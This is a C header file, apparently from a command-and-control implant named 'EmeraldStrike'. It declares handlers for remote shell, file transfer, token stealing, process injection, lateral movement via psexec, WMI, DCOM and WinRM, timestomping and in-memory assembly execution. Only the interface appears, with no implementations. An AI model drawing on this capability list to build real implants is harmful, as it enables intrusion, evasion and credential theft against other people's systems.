#ifndef EMERALDSTRIKE_COMMANDS_H
#define EMERALDSTRIKE_COMMANDS_H

#include "common.h"
#include "parser.h"
#include "package.h"

typedef VOID (*COMMAND_HANDLER)(PINSTANCE inst, PPARSER args, PPACKAGE response);

typedef struct _COMMAND_ENTRY {
    DWORD           hash;
    COMMAND_HANDLER handler;
} COMMAND_ENTRY, *PCOMMAND_ENTRY;

VOID dispatch_command(PINSTANCE inst, const char* cmd_name, BYTE* args, DWORD args_len,
                      BYTE** out_data, DWORD* out_len, BOOL* out_error);
VOID register_commands(PINSTANCE inst);

// Command handlers
VOID cmd_shell(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_ls(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_cd(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_pwd(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_cat(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_upload(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_download(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_exit(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_sleep(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_whoami(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_getuid(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_ps(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_screenshot(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_run(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_execute(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_make_token(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_steal_token(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_rev2self(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_getprivs(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_ppid(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_blockdlls(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_link(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_unlink(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_psexec(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_psexec_psh(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_wmiexec(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_dcomexec(PINSTANCE inst, PPARSER args, PPACKAGE response);

VOID cmd_winrm(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_kill(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_cp(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_mv(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_rm(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_mkdir(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_inline_execute(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_inject(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_config(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_spawnto_x64(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_spawnto_x86(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_spawn(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_argue(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_execute_assembly(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_powerpick(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_link(PINSTANCE inst, PPARSER args, PPACKAGE response);
VOID cmd_unlink(PINSTANCE inst, PPARSER args, PPACKAGE response);

#ifdef INCLUDE_CMD_ENV
VOID cmd_env(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_DRIVERS
VOID cmd_drivers(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_TASKS
VOID cmd_tasks(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_SERVICES
VOID cmd_services(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_SOFTWARE
VOID cmd_software(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_NETSTAT
VOID cmd_netstat(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_ARP
VOID cmd_arp(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_ROUTE
VOID cmd_route(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_LOCALGROUP
VOID cmd_localgroup(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_SHARE
VOID cmd_share(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_DOMAININFO
VOID cmd_domaininfo(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_UAC
VOID cmd_uac(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_DEFENDER
VOID cmd_defender(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_WINDOWLIST
VOID cmd_windowlist(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_UPTIME
VOID cmd_uptime(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_QUSER
VOID cmd_quser(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_FIND
VOID cmd_find(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_GREP
VOID cmd_grep(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_TREE
VOID cmd_tree(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_STAT
VOID cmd_stat(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_TIMESTOMP
VOID cmd_timestomp(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_WGET
VOID cmd_wget(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_PSGREP
VOID cmd_psgrep(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_PROCINFO
VOID cmd_procinfo(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_CLIPBOARD
VOID cmd_clipboard(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_PING
VOID cmd_ping(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_DNS
VOID cmd_dns(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_PORTSCAN
VOID cmd_portscan(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#ifdef INCLUDE_CMD_CURL
VOID cmd_curl(PINSTANCE inst, PPARSER args, PPACKAGE response);

#ifdef INCLUDE_CMD_SPOOF_TEST
VOID cmd_spooftest(PINSTANCE inst, PPARSER args, PPACKAGE response);
#endif
#endif

#endif // EMERALDSTRIKE_COMMANDS_H
